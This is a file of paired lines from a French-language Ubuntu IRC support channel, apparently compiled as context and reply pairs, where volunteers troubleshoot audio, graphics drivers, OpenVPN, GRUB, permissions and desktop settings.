non personne ?	bah en même temps c'est un salon de support pour une distro, pas un salon d'info pour un GUL parisien … faut contacter ubuntu-paris ou parinux
Ubuntu, forcement, mais bon k :X y unity ou autre, c est quand meme un sacre bordel tout ca.	ubuntu gnome classic
)	qt-config
oops desle pour le spam.	hah tant mieux :)
https://launchpad.net/~xorg-edgers/+archive/ubuntu/ppa	C'est tout le problème, je ne vois pas le rapport entre le numéro 349/346... et ma carte...
back up tout avant, chez moi 15.04 c est pas instable, c etait juste ca demarre pas.	J'ai des partitions système/data séparées du coup le risque de perte de donnée est plus faible
Je sais bien, mais je suis joueur ^^ (et au pire ça me plante mon système, et ça me donnera une excuse pour installer la version 15.04	déjà regarde quelle version est pour ton matos
(J'ai téléchargé ceux ci : http://www.nvidia.com/Download/driverResults.aspx/76278/en-us)	840M il te faut un ppa
j ai essaye banshee mais j aime bien clementine donc l option Y c est pas une option en fait. Et le probleme du son a l infini, j ai eu ca aussi sur firefox...	je te propose de lancer clementine dans un terminal: (il suffi de taper clementine) puis lancer de la musique et de le fermer, et si tu veux bien nous dire ce qui se passe dans le terminal
j ai dash en dock, donc menu dash clementine ou dans clementine avec l icone.	je cherche pas ton gout, je cherche à savoir si c'est un probleme de logiciel, ou de codec ou …
Gnome	et ça arrive avec tout autre logiciel ?
non	tu fermes clementine comment ?
ca s arrete.	ok, t'es sous unity là?
desolé pour le temps, je crois aue c est ca http://paste.ubuntu-fr-secours.org/src-141720	essaie: killall clementine
c'est fait.... ca tourne tjrs. c est pas dramatique, juste c est a l infini.	tu vois un truc?
<- j apprend.	ouvre clementine et fais jouer un truc, puis éteints le
Ca? c est le debuglog version ubuntu?	rien de spécial dans ce log
j essayais de comprendre la manip !pastebin	rien à comprendre, juste fais ton copier/coller dans http://paste.ubuntu-fr-secours.org/
!paste	en cherchant, j'ai trouvé un bug avec ton Conexant CX20751/2
merci a toi plutot.	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Codec: Intel Broadwell HDMI Codec: Conexant CX20751/2	maintenant tape: dmesg | grep -i Audio
Re moimeme, tu t'en sors?	ouvre un terminal puis tape ceci
je chipolate. ca marche tres bien... juste 2/3 truc a comprendre.	t'es dessus la ?
La de suite; je lance de la zik sur clementine, une chance sur deux si je ferme le programme; ca continue a tourner, jusqu'a que ca plante. Rien de grave.	sur un portable ou un pc?
Et puis j ai compris ce que voulait dire LTS... et je demandais si je n devrais juste pas etre en 14.10. Commencons par marcher avant de courrir.	les LTS sont généralement plus stable, mais pas "dernier cri"
Quelques années que je pratique xbmc donc je comprend les problematiques stable/nightly, A priory 14.10 c est quand meme correcte pas juste beta test?	14.10 est sortie en Octobre 2014
j ai remarqué une vilaine tendance a voir mes programmes qui sortent de la musique, de devenir incontrolable... que ca soit Clementine, ou youtube.... une fois lancee, ca ne veux plus s arreter... meme fermé ca ne s arrte plus; et parfoit meme des fois le portable ferme. Puis ubuntu freez, et ca redevient normal... j suis sur ubuntu 14.10; donc pas LTS j suis sur une 'beta' ou rien a voir?	Une fois la release passée, si tu fais la mise à jour, ta beta devient normal.
^^	y'a personne?
mais avec tomato ça l'est	/join #openwrt
(version v2 c'est justement celle avec 128mo/128mo)	si
c'etais plus pour crysis du coup	par contre il doit etre supporté par openwrt, dd-wrt… je viens de verifier, il est sur la liste de support de tomato shibi mod http://tomato.groov.pl/?page_id=69 (le firmware que j'utilise chez moi)
Je vois, un faux espoir :(	peut etre cette distib http://wiki.openwrt.org/start
128mo*	le processeur sur ton netgear, c'est un mips74k
Savez vous si le WNR3500Lv2 supporte ubuntu ? ou debian ?	c'est ton mot de passe ?
si mais c est ca je pense, bios/legacy/csm c et pareil. si ton disque dur etait comme ca, ca devrais le faire.	http://doc.ubuntu-fr.org/touchpad_asus .
dans ce cas la je ne sais pas... je sais que perso j ai eu des problemes avec bios/efi... et les pbs partition gpt/autres.	"xinput" est une commande qui liste les entrées.
alt fleche ca marche bien aussi, p'tete juste changer mes habitudes ;)	Il faut voir si il y a des pilotes fait pour ton modèle de pc. Que donne http://doc?.ubuntu-fr.org/ ?
vi	si tu as une i/o err, tu dois avoir une trace dans le dmesg.. ca passe pas inaperçu, ça, theoriquement
Y'en a pas une qui te dit mieux que ça _où_ est l'erreur ?!	bin non :/
c'est pas ton support d'install qui foire, plutot ?	18:31:41 <nW44b> j'ai testé d'autres distribs et ddeux autres clés usb, j'ai le même problème
et le device, c'est bien ton ssd ?	bah oui :)
tu as pas gardé le log de l'install ?	non c'était hier
pourtant c'est un thinkpad x300 je ne devrais pas avoir de problème(s)	"erreur de I/O" <-- tu as vu ça où, dmesg ?
t'es sérieux ? 0_o	if : input file, of : output file. rien n'est écrit sur ton sdd, contrairement à la commande inverse
le mieux c'est ptet que je redémarre et que je regarde le syslog jute après	oui ^^
je tente je reboot	ça fonctionne encore ?
de lancer xbindkeys et de refaire la manip	ton écran ta souris, ton kernel etc tout ce qui est essentiel au bon fonctionnement de ta 'buntu
et l erreur c est xbindkeys: no process found	ça a fonctionné ou pas ?
le parametre en question est acpi_backlight=vendor, dans ton cas ça serait d'ajouter donc dans ton cas acpi_backlight=intel_backlight	à quoi correspond /sys ?
grrr, ca me plante des que j appuie sur getkey	en // de ce que tu effectues, peux tu donner ce résultat ls /sys/class/backlight/
merci	ça plante comment ?
dans /user/bin	/usr n'a jamais voulu dire /user :D
copier ou créer un truc dans /usr/bin, c'est moche	mieux non ?
gedit je crois, c est dans ca que ca l as ouvert	en fait, ta's copié le script quelque part ?
:)	vu qu'il a pas retroeclairage dans le path, ça vaut dire qu'il a pas copié le script dans /usr/bin comme demandé
je dois redemarer peut etre?	si tu tapes dans un terminal sudo find / -name retroeclairage ça donne un résultat ?
ah non ok	http://tinyurl.com/c55axgm ? :), bon, bein ça sera pour une prochaine alors :(
http://tinyurl.com/c55axgm ? :), bon, bein ça sera pour une prochaine alors :(	tien je l'avais aps revu celle-là
en faite je veux juste faire marcher mes touches de retroeclairage qui ne fonctionne pas pour le moment	je pense que ceci peut aider ( https://wiki.archlinux.org/index.php/Xbindkeys ), mais si quelqu'un a testé ça serait bien. ça doit être dispo sur ubuntu aussi
j essaye de faie marcher des touche de retroeclairage comme expliquer ici http://doc.ubuntu-fr.org/retro-eclairage	je viens de lire
c est quoi le programme pour faire des script svp?	tu veux démarrer le script au démarrage ? regarde avec crontabs
Bjrs, j aimerais bien faire fonctionner le 'two finger scroll' horizontal sur mon portable... le vertical marche bien, mais pas l horizontal (a vrai dire il ne fonctionne pas sur pc non plus sans les drivers du fabricant). Une idee pour m aider? j avais essayer touchegg sans succes..	scripts de ? bash ?
oui je vais retenter	ce doit être pour ça que j'ai pas de souci, alors
sur mon PC de 2012, il y a un XUbuntu et un Windows 7 en dual boot	sur le même disque dur ou non ?
y a plusieurs iso ?	mon PC fixe avec un UEFI date d'aout 2012, et il n'a jamais eu de soucis pour installer XUbuntu
bah c'est aps si vieux	tu utilises l'iso francophone ?
boot*	aucune idée, j'y comprends rien pour le moment, mais en tous cas, j'ai deux PC avec des UEFI, et j'en ai installé au moins deux autres modèles munis d'UEFI aussi, sans avoir de souci avec (x/k)ubuntu
t'as un hdd de plus de 2.2 TO Exagone313 par exemple ?	non
live usb persistent sinon	tu peux dire que ça ne te convient pas, mais difficilement que c'est de la merde
ah je suis pas au courrant de son évolution, mais c'est ce qui m'a permis de tester ubuntu à la base	selon la doc, wubi n'est pas compatible avec les UEFI, ni avec les partitionnements GPT
j'ai utilisé ubuntu comme environnement de bureau pendant un an et je n'ai jamais utilisé thunderbird et pidgin	Ubuntu n'est pas un environnement de bureau, c'est une distribution ;)
merci	le plus imple, pour une migration tranquille par etape, c'est de commencer par utiliser des logiciels libres sous windows pendant quelques mois: firefox, thunderbird, pidgin, libreoffice … et de basculer sous linux en utilisant les mêmes logiciels
ok	s'il n'y a que ces logiciels qui te font douter d'un passage sur ubuntu, tu peux te lancer dans l'aventure ;)
la suite bureautique	libreoffice est dispo sous linux (dont ubuntu) macosx et windows
j ai chercher sur le net. Ils précisent tous qu'il faut changer le comportement de la touche caps lock mais je ne trouve pas l'option	ca se regle dans les options d'agencement de clavier
ca se regle dans les options d'agencement de clavier	je n'arrive pas à trouver cette option
j'aimerais savoir si j'aurais sous ce système d'exploitation les logiciels nécessaires (équivalents à ceux de win)	sur ubuntu tu peux utiliser LibreOffice (tu même l'installer sur windows pour tester)
sous Ubuntu, par défaut, caps lock, ça met le caractère en majuscules, ça ne change pas de caractère	je comprends la phylosophie et j'en suis complètement d'accord mais le problème des windowsien est que les habitudes sont très ancrées et ne peuvent rarement être changées. y a t il une manip pour que quand le caps lock est activé, qu'il s'agisse du shift qui reste appuyé
Je suis allé dans /var/log, mais il ya trops de fichier. Je ne sais pas lesquels contiennent les erreurs.	quel est ton soucis
Désolé j'ai le système qui a planté, quelqu'un m'a-t-il répondu ?	non
bonjour	bonjour
np	on peut avoir plus de 4Go pour les données persistantes j'ai une clé de 32Go
yep	d'accord merci bien :) je fais un feed après
jcrois pas que uefi change rien, et oui de windows	c'est bien celui-ci http://www.pendrivelinux.com/universal-usb-installer-easy-as-1-2-3/
et voila	je peux faire ça depuis windows ? et je rappel l'ordinateur est en uefi ( je sais pas si c'est important comme précision )
yes	y'a aucun probleme réseau côté client ?
fausse piste	tu cherches juste à mettre un server openvpn en place déjà dans un premier temps ?
read UDPv4 [EHOSTUNREACH]: No route to host (code=113)	et les logs ?
http://www.onlineconversion.com/html_chmod_calculator.htm	c'est moi qui l'ai fait partir?
je l'ai fait via l'interface graphique, j'ia juste prit lecture seule ça ira. ^^	en fait non c'etait bon, sauf que j'ai inversé les modes
J'y vais merci encore !	en fait j'étais dans l'erreur
merci c'est bien. Maintenant que ça va être bien organisé, ce Xubuntu va être propre et clair	pour comprendre les modes, lecture = 2^0 = 1, ecriture = 2^1 = 2, execution = 2^2 = 4, le chiffre 5 c'est 2^1 + 2^2
ce chmod, va t il changer quoi que ce soit au niveau de l'exécution du programme ?	tu peux toujours le faire en mode graphique, tu cliques droit sur l'icone du lanceur, tu vas dans permissions, et tu mets dans Lecture seule en face du Propriétaire
ou 500, peu importe	pierre@pierre-System-Product-Name-System-Product-Name:~$ cd Desktop
je sais que ce n'est pas grave, mais si on pouvait trouver un moyen de rendre "insuprimable" les icones du bureau ça pourrai être bien	ouvre un terminal et cd Desktop
oui	bah change les permissions alors
es ce que linux gagne du terrain sur windows ?	sur quel de ?
mezen j'ai fait une erreur quelque part, je n'arrive pas à ouvrir le truc où je vais pouvoir voir le show desktop	bah clic droit sur le panel en haut et va dans préférences
bah clic droit sur le panel en haut et va dans préférences	 arg c'set archi simple ^^super merci
 arg c'set archi simple ^^super merci	il suffit de fouiller un peu
il suffit de fouiller un peu	j'ai une question plus retorse peut-être :  peut on sauvegarder des icones sur le bureau ? Parfois mon grand père supprime une icone et est perdu ensuite.
tailf?	c'est une commande :), sudo tailf /var/log/openvpn-ashnetwork.log
bah c'est pratiquement ma config, sauf que je push pas les dns	tu as aucun log-append non plus
voilà beaver , régale toi: http://pastebin.com/sckvqFPe http://pastebin.com/Tg87N04J http://pastebin.com/iN9e1RLJ http://pastebin.com/EMVwRcnp	arrête moi si je me trompe..
ué, attends	quelque chose me perturbe rien qu'ici : local 5.39.xx.xxx c'est l'ip locale qu'il faut définir ensuite, si tu dois faire tourner deux daemons, faudra surement le faire sur deux ports diff -> port 1194
comment on fai t?	tu vois sur cette image http://core0.staticworld.net/images/article/2013/02/5-customizing-xfce-panel-items-100026230-large.png
je suis dans Créer un lanceur je peux mettre le nom, commentaire commande répertoire de travail mais pas comment choisir le bureau, ou ensuit ela mettre dans le tableau de bord (c'est mon but)	tu veux dire quoi par envoi graphique?
genre ajouter un panel en bas si t'en as pas, puis rajouter des "items" dedans	merci. hum je crois trouver mais je ne sais pas quelle ligne de commande tapper pour l'envoie graphique sur le bureau
La barre de propriété de la barre transparente des icones e nhaut ? Jepeux changer le style, c'est tout	t'as qu'une seule barre?
t'as qu'une seule barre?	oui cela me semble normal, j eparle bien de la barre tout en haut où on voit les applications ouvertes s'afficher ainsi que l'heure
oui cela me semble normal, j eparle bien de la barre tout en haut où on voit les applications ouvertes s'afficher ainsi que l'heure	peux-tu voir si tu peux faire ceci: http://www.linuceum.com/Distros/osDesktopConfigXfce.php
ce n'est plus cet horrible sytème d'Unity ça doit être gnome je ne sai spas	ou préférences je sais plus
Xubuntu pardon	clic droit sur la barre et propriété, ça fait quoi ?
Autre chose, j'aimerai ajouter une icone tableau de bord qui renvoie sur le bureau, comment faire ?	quel bureau t'as?
mais ça j'y réfléchirai plus tard, d'abord configurer les vpn	en un mot : iptables :)
jsais pas si jsuis clair	un filtrage par protocole ?, tu veux rediriger le traffic p2p sur un autre server par exemple ?
np asharas	sous thunderbird je cherche à augmenter la taille de police des noms des mails recus, pas des mails qu'on écrit, sais tu comment on fai tça ?
:)	oui effectivement, moi je suis un peu les bugs sur bugzilla gnome
oui effectivement, moi je suis un peu les bugs sur bugzilla gnome	:)
:)	viens un peu en pv
le 3.16 étant releasé le 25 mars	mais j'aime pas être top of date, je migre de lts en lts
trop peu de choses se feront après	trop peu, bein non quand même pas
et tu fais la cuisine?	et toi..
et toi..	est ce que tu penses qu'il n'est pas trop tot pour faire un do-release-upgrade ?
après seule la mise à jour sera gratuite	même ma compagne n'utilise plus Windows, c'est simple, mono boot ubuntu pour tous à la maison ^^
Secureboot de mes c*uilles bloqué sur les PCs Windows 10 OEM et secure boot obligatoire pour booter sur windows 10	donnnnnc ? ça foire à quel moment ?
ok	ça donne quoi ? :)
Toujours ce hachage et... SURPRISE! Le pilote a meme pas changé!	lance l'installation depuis un terminal, sudo apt-get install fglrx-updates
côté fps -> ?	non, pas de le log dpkg, elle a tout fait en graphique, ce n'était pas une installation de softs, juste de polices, et elle a tout fait en terminal.
à savoir, j'ai dans mon dossier /etc/openvpn deux fichiers .conf (un pour chaque vpn) et 2 dossiers contenant les fichiers nécessaires (client.crt et .key ainsi que le ca.crt et le ta.key)	ton server.conf et ton/tes client.conf ? ils ressemblent à quoi ?
mais je me demande si j'ai procédé de la bonne manière	pourquoi lances tu deux instances openvpn ?
Mmmh... je clique sur appliquer les changements et il reselectionne xorg, je note aussi que le fenetre de terminal affiche quelque chose, je pastebin	et via le paquet -update
oui beaver, un fichier par vpn	rien de probant dedans ?
Salut tout le monde! y a-t-il quelqu'un qui maîtrise OpenVPN? Je cherche à faire tourner 2 instances (client) sur une machine mais la seconde carte virtuelle tun n'est pas crée automatiquement. Une piste?	une erreur ?
Ah et j'ai 2 écrans branchés sur les sorties de la carte graphique et un écran branché sur la carte mere tous ont une définition de 1280*1024 chacun	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
mp si tu veux clache :)	Vas-y.
Merci pour la suggestion. :)	le var / log / dpkg.log aussi tu peux le check.. faut cerner ce qu'elle a effectuée
et tu croises les doigts pour qu'elle utilise le CLI ^^	je suis chez elle. ^^
je suis chez elle. ^^	mais avant ça, t'as des pistes dans les logs ?
(pas depuis le menu)	sudo apt-get install --reinstall thunar
c'est logique même :þ	ça ne fait pas que supprimer les métadonnées
donc ça marche qu'une fois l'optomisation, c'est cool	tu sais ce que fait ta commande ?, pourquoi vas tu par exemple supprimer à plusieurs reprises les metadonnes de ton image ?
dans les pays du tiers monde, tout le monde n'a pas la chance d'avoir le 64 bits	non mais j'argumente plus :(
(si me demande ça au cas ou j'uploade d'autres images via mon CMS)	jcrois qu'il faut que tu demande explicitement a ton prog de faire un traitement lossless, mais je connais pas jpegoptim
jcrois qu'il faut que tu demande explicitement a ton prog de faire un traitement lossless, mais je connais pas jpegoptim	quand je relance la commande, ça m'affiche ça : ./alcatel-lucent.jpg 200x150 24bit N JFIF  [OK] 5118 --> 5118 bytes (0.00%), skipped.
ok, merci pour le rappel :)	vraiment, c'est pas la prioritée de valve de faire des fix pour des systemes 32b =)
Zic j'ai bien fait de mettre ma phrase au conditionnel alors ok, comme stipulé, j'ai cru que c'était les directives de Canonical qui faisaient foi sur ce channel .. je suis rouillé aussi ^^	par contre, niveau canaux anglophones, c'est différent
j'ai 12go de ram	oui mais tu sais quand tu remontes un probleme sur un Forum (de maniere propre, en mode debug), ça permet aux devs de patcher le probleme si probleme il y'a, si tout le monde aurait la même mentalité que toi ( :-) ), il n'y'aurait aucun correctif, essaye de voir les choses ainsi.. :þ, Zic j'ai bien fait de mettre ma phrase au conditionnel alors ok, comme stipulé, j'ai cru que c'était les directives de Canonical qui faisaient foi
peu..	sur les canaux #ubuntu-fr, on admet les déclinaisons officielles (Desktop/Server et même Phone même si tu ne trouveras pas beaucoup d'aide ici...), mais également les "flavors" approuvées par Canonical
un peut plus de ram(*)	j'ai l impression que c est un problème avec l'archi 64 bits
c'est un exemple	oui je l'ai d'installer
as tu le paquet light-themes ? xorn	boarf non, les systemes 32bits sont en fin de vie hein, ils vont pas faire de support pour un systeme obsolete, il aurais surtout fallu que j'allume au bon moment quand j'ai telecharger l'iso =)
LoadPlugin: failed to initialize shared library /usr/lib/mozilla/plugins/libtotem-cone-plugin.so [/usr/lib/mozilla/plugins/libtotem-cone-plugin.so: mauvaise classe ELF : ELFCLASS64]	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
s/valeur/foi, je me trompe peut être, mais je doute :°	Désolé, au lancement de zimbra desktop avec la commande :
tu as 2 types de corrections possible, la correction d'un bogue, correction d'une faille de sécurité.. , Ju-no[Oebalus] y'a du monde ou bien ? :D	Tu confonds sponsoring et support. Kubuntu est officiel.
Tu confonds sponsoring et support. Kubuntu est officiel.	nous lisons tes arguments ?
nous lisons tes arguments ?	Ton lien dit la même chose, kubuntu n'est plus sponsorisé financièrement, mais reste supporté.
Ton lien dit la même chose, kubuntu n'est plus sponsorisé financièrement, mais reste supporté.	Ubuntu c'est Canonical grosso merde, si Canonical ne reconnait plus le support de ce dernier, ça tombe en version non officielle
j'aimerais savoir si quelqu'un a réussi a installer ZIMBRA desktop sur ubuntu 14.10	bienvenue, si tu veux une réponse concise, essayes de l'être de ton côté (le plus possible), http://doc.ubuntu-fr.org/tutoriel/comment_obtenir_une_reponse_satisfaisante
bref, j'attendrais encore un peu, c'est pas pressant	remonte le probleme sur le forum steam :)
est-ce que les variantes kde, gnome ect vont sortir en meme temps que la version unity ?	mais être top of date sur une machine en prod' c'est stupide
d'accord merci :) je vais essayer et voir ce que ça donne	http://doc.ubuntu-fr.org/grub-pc#placer_windows_en_premier_dans_le_grub . Ce n'était pas long à chercher.
non 2, la numérotation commence à 0	je sais pas si la valeur 0 équivaut à 1 dans notre cas
je sais pas si la valeur 0 équivaut à 1 dans notre cas	j'ai regardé la page info en haut de/etc/default/grub
je dois modifier quoi dans /etc/default/grub ?	GRUB_DEAFAULT
GRUB_DEAFAULT	d'accord j'ai GRUB_DEFAULT=0 je dois mettre à 1 ou 2 ou selon l'ordre d'apparition au boot ?
perso, mon grub boote par défaut le dernier système booté	tu fais comment stp ?
https://launchpad.net/grub-customizer	ou sinon, c'est juste 1 ou 2 lignes à modifier dans /etc/default/grub, sans ajouter un ppa...
tu es sur une version beta spl33n ?	je sais plus, je devais y a un moment faire une migration mais me rappel plus si j'avais déjà fait la migration
cat /etc/lsb_release me retourne en effet ubuntu 14.10	Je crois que lors de la mise à jour qui suit une release, les betas deviennent des versions normales(à vérifier).
lsb_release -a	si c'est une beta ça le mentionne puisque je vois rien qui me le dis
c'est pour ca que c'est une manip à reserver pour des installations des meme paquets sur la meme version de la distro	je dois utiliser quelle commande pour savoir la vrai version que j'ai, je crois que je suis toujours à la version 14.10, mais me rappel plus si c'est une beta ou pas
autre question, pour ma clé et config gpg je dois juste sauver le repertoire .gnupg ? ou je dois faire autre chose ?	non, sauf si la nouvelle version n'utilise pas les memes paquets par defaut, car la manip reinstallera les anciens
bonjour à tous comment faire pour sauver la liste des paquets qu'on à installé pour pouvoir par la suite les ré-installer après un changement de version de ubuntu ?	mais bon, le plus simple reste de faire une migration
mais bon, le plus simple reste de faire une migration	j'ai lu cette page, j'ai trouvé la commande donné par deadrats la dessus et suivis les liens sur les forums mais les scripts ne me donnent rien
j'ai lu cette page, j'ai trouvé la commande donné par deadrats la dessus et suivis les liens sur les forums mais les scripts ne me donnent rien	get-selection sert surtout à copier l'etat sur une autre machine ou à sauvegarder la liste pour pouvoir reinstaller la meme version
dpkg --get-selections > paquets.lst	oui j'ai vu cette commande dans le wiki ubuntu-fr mais le soucis c'est qu'après j'ai plein de paquet qui seront déjà présent dans la nouvelle version et dont pas necessaire et puis les dépendance
ahh et si je utilisais fdisk ?	gparted ne veut pas créer une table de partitions ?
si on en crée une, puis une seconde, et qu'on retire la première, l'unique partition restante aura le numéro 2, si je ne me trompe pas	Pour sdb2, j'aurais été sur, mais présenté comme ça l'était, ça m'a paru bizarre.
la deuxième*	Justement, c'est bizarre qu'elle porte un numéro 2 comme indiqué ligne 21, alors qu'elle est toute seule.
oui	Sur ta clé, il n'y a pas de loquet bloquant l'écriture?
J'ai un problème avec ma clé usb merci de m'aider http://s29.postimg.org/ynfrvp4uv/dev_sdb_GParted_001.png	supprime la partition, et recrée là ?
supprime la partition, et recrée là ?	je n'arrive pas impossible de l'accèder
X-cache : MISS from slis	recharge sans tenir compte du cache (Crl+F5), pour être certain qu'il charge tout depuis le serveur :)
j'ai fait xubuntu-restricted-extras. Je suppose que c'est la même chose non ?	quelle version de Firefox ?
mais ligne de commande si ca marche toutes les app, oui	Si c'est firefox qui a des ratés, il est sous ce nom dans le system monitor. Idem pour les autres.
en fait une question, y as un moyen de "force quit" une appliquation autre que les "processes" du system monitor? (qui ne veulent pas dire grand choses quand on ne sait quoi fais quoi)	en ligne de commande ?
mais au bout de quelques jours ca commence a bien se passer :)	heureusement que 150 personnes ne répondent pas "bonjour" dès qu'une personne arrive, sinon, on arriverait plus à lire les conversations :)
j ai un probleme de chat ou c est juste un chat de pleins de gens qui ne disent rien?	les gens parlent quand quelqu'un pose une question
certainement plus modulable, ce qui va entrainer le développement d'extensions et d'autres fonctionnalités donc plus de mémoire à consommer	La différence est significative, même si cette version de lxqt ne devait pas être encore optimisé.
La différence est significative, même si cette version de lxqt ne devait pas être encore optimisé.	pour la 0.9 c'est ici http://newscentral.exsees.com/item/feed61356d9345cde8568b323d233238-d7cb4689dbc7a63c7e25c9584e616090
pour la 0.9 c'est ici http://newscentral.exsees.com/item/feed61356d9345cde8568b323d233238-d7cb4689dbc7a63c7e25c9584e616090	Bah voilà la réponse, un openbox seul. ;-)
http://www.phoronix.com/scan.php?page=news_item&px=LXQt-0.9-Released	Non, puisque je ne suivais plus l'actualité.
Non, puisque je ne suivais plus l'actualité.	à priori il y a encore du travail pour la version 0.9
heh	4Gio, Core2Duo 2,66Ghz, 1600x900, 320Gio de disque dur.
4Gio, Core2Duo 2,66Ghz, 1600x900, 320Gio de disque dur.	je n'ai pas les benchmarks pour la version 0.9, mais en tout cas, il y a 26 Mo à battre pour le bureau, mais aussi gagner sur les autres logiciels et applications graphiques que l'utilisateur utilise
Je ne la regarde pas, je n'ai pas de carte son... Je me suis contenté du titre...	il est temps de te payer une vraie bécane :)
il est temps de te payer une vraie bécane :)	Il est temps de donner des cours pour gagner ma vie. ;-)
Il est temps de donner des cours pour gagner ma vie. ;-)	puis coté lightweight, lxde est encore plus léger que lxqt
c'est un peu leur honneur qui est en jeux	c'est justement mis en evidence dans le videos si dessus
+ce	oui d'accord avec toi mais KDE est basé sur qt aussi, et la légèreté c'est pas vraiment son cas
oui d'accord avec toi mais KDE est basé sur qt aussi, et la légèreté c'est pas vraiment son cas	+1.
donc c'est plus nokia depuis 2012	oui c'est Digia qui l'a acheté
aujourd'hui il a plusieurs types de licences	J'ai aimé lubuntu pour sa légèreté. Maintenant, je le connais très bien et peut me le personnaliser à fond, c'est que j'aime. Le choix entre gtk et qt m'importe peu. Pcman a souhaité passer à qt car c'était plus léger et rapide.
:)	Qt a été libéré, non?
Je pense avoir trouvé la réponse, 15.04 n'aura pas lxqt.	bah moi je reste avec du vrai libre
padding.height	Bonne idée, car il contient padding.width: 0 , mais rien pour height...
Bonne idée, car il contient padding.width: 0 , mais rien pour height...	si ça marche pas: essaye avec window.client.padding.height
si ça marche pas: essaye avec window.client.padding.height	Pour moi, je me dis que ce n'est plus l'heure d'apprendre plus de gtk, j'étudirais qt quand lubuntu y sera passé. ;-)
C'est chelou! Le placement des fenêtres avec openbox tient compte de l'épaisseur des bordures en largeur, mais pas en hauteur... Sur ma lubuntu, j'ai une fenêtre de x=300 et y=600. Pour placer une fenêtre à coté sans la chevaucher, je dois me placer à 300 en x et à 602 en y... O_o	ça devrait etre défini dans le theme
ça devrait etre défini dans le theme	Non, c'est pareil, malgré avoir reconfiguré openbox. On ne va pas se prendre la tête, bientôt on sera sous lxqt...
Vu..	en fait avant de poser ma question, j'ai parcouru beaucoup de forums sans trouver de solution, c'est pourquoi je la pose ici
j'ai une erreur qui apparait toujours lors du chargement système. est ce que quelqu'un sait comment la résoudre ? "systemd-udevd[2186]: failed to execute '/lib/udev/socket:/org/freedesktop/hal/udev_event' 'socket:/org/freedesktop/hal/udev_event': No such file or directory"	merci pour ta réponse
merci pour ta réponse	de rien
hal itself has been deprecated many years ago, so this is most likely a "wontfix".	je n'ai ni hal ni libhal, ni /lib/udev/rules.d/90-hal.rules
J'ai peur d'avoir du tearing sans driver :s	Fais un test, c'est plus rapide. ;-)
bref, patiente un peu	et avec le free je vais disposer d'une bonne perf ?
c est mon cote overkill	mais c'est quoi le rapport avec Ubuntu si je peux me permettre ?
Yop à tous ! Est ce que vous savez si c est possible de tracker/GetPosition une addresse SSID ou MAC avec les services de geolocation de Google / LaPomme ou Mozilla ?	il est préférable de poser la question une seule fois, dans le chan approprié, que partout en même temps...
tu peux utiliser des ID Tox	sinon, sur mon avis purement perso/parano : c'est chiffré mais ça reste du P2P
enfin ça c'est pareil tu sais pas qui est derriere	Le service de téléphonie SIP ippi.fr fait passerelle avec skype.
https://tox.im/	différence avec Jabber et du GPG ?
donc posez des questions me sert a economiser des recheche sur google ou avoir a tester ces logiciels moi meme et m'apercevoir qu'il manque des fonctionnalites	donc prendre l'habitude de poser des questions relatives et non subjectives est un premier pas
oui je suis daccord SurcouF  mais etant debutant sur linux j'aime bien apprendre plein de choses	le but des librairies est d'être partagées par plusieurs logiciels
oui	http://docs.xfce.org/xfce/thunar/custom-actions ?
ok laisse tomber en faite j'avais envoyer vers sa me permet pas de selectionner un dossier bien precis mais c pas grave	donc, dans le contexte de l'explorateur de fichier ?
je cherche a ameliorer le menu du clic droit , c'est a dire y ajouter des fonctionnalites quelqun sait comment on fait ?	Avec firefox, le userChrome.css te permet de changer beaucoup de choses.
quelqun pour un petit rensegnement	Et sur quelle variante?
http://rosbia.com/2014/01/31/9-signes-quil-est-temps-de-changer-damis/ <- le 9eme signe c'est le disque dur ext4	 haha
sinon npm link tontruc ça aide souvent	pourquoi il ne me fait pas le lien symbolique qui va bient dans ~/../node-modules/
est ce que c'est dans ton PATH ?	la je sais ou il est  ..
npm link tontruc	ensuite je m'attends à avoir la commande oven
(pas d'autre idée !)	je n'arrive pas non plus à la formater dans Windows
et au dmesg, tu as des erreurs lors du mount ?	on dirait que non
non	et installer le pilots directement depuis Nvidia? Bonne ou mauvaise idée?
ce de manière à ne pas avoir toutes les mises à jour de xorg-edgers, potentiellement instables	si je supprime le ppa, je n'aurais plus les maj du pilote?
pas de risque de sécurité, par contre il est recommandé de supprimer le PPA une fois que tu t'en es servi	effectivement, il conseille de laisser le ppa pour avoir les pilotes ET les autres packages. Mais j'ai des doutes
bein ça touche plus le channel #lxde quand même nan	Ici, on s'occupe de toutes les variantes officielles, voir /topic .
Ici, on s'occupe de toutes les variantes officielles, voir /topic .	oui enfin lxde utilise que dbus-send pour envoyer ses messages dans un popup ?
J'ai essayé de comprendre https://developer.gnome.org/notification-spec/ , mais je ne saisi pas tout.	http://ubuntuforums.org/showthread.php?t=1121657
mais...	Le système de notification de lubuntu marche bien, c'est pourquoi je souhaite l'utiliser. Mais je n'ai pas trouvé le manuel.
Le système de notification de lubuntu marche bien, c'est pourquoi je souhaite l'utiliser. Mais je n'ai pas trouvé le manuel.	bein si il fonctionne bien, strace le
Mon but est juste d'envoyer quelques mots dans le 'summary', au pire dans le 'body'.	il semblerait que ce ne soit pas possible avec dbus-send
voilà le hic, moi je bloque sur son message 3/30/15 22:49   *clache: beaver: Car "Le programme « notify-send » n'est pas encore installé." …  ce paquet n'existe pas nous sommes ok	il a parlé de programme, pas de paquet :)
il a parlé de programme, pas de paquet :)	car il est offtopic, il me trouble le Monsieur.
mh	Oui, le paquet est libnotify-bin.
Oui, le paquet est libnotify-bin.	tu peux pas
sudo apt-get install notify-osd <- http://ubuntuforums.org/showthread.php?t=1411620	Je viens de regarder ton lien. La syntaxe est vraiment différente.
N: Impossible de trouver le paquet notify-send	Concis, non. C'est en donnant le plus de détail possible sur les recherches et tests que j'ai effectué que je peux suciter de l'aide. La section 'summary' est dans la spécification de freedesktop. Et si j'avais précisé que j'utilisais une lubuntu, c'est bien parce que notify-send n'y est pas. :-)
tu peux être plus concis s'il te plaît	Car "Le programme « notify-send » n'est pas encore installé.". Je ne compte pas court-circuité l'installation par défaut.
Est ce bien le bon salon en cas de soucis merci	oui … encore faudrait-il que tu nous l'exposes :)
i915 784207  3 drm_kms_helper 55071  1 i915 drm 303102  4 i915,drm_kms_helper  i2c_algo_bit 13413  1 i915 video 19476  2 i915,asus_wmi	vois déjà pour vbeinfo
on peut donner n'importe quel format ?	bon déjà le drivers est bien chargé
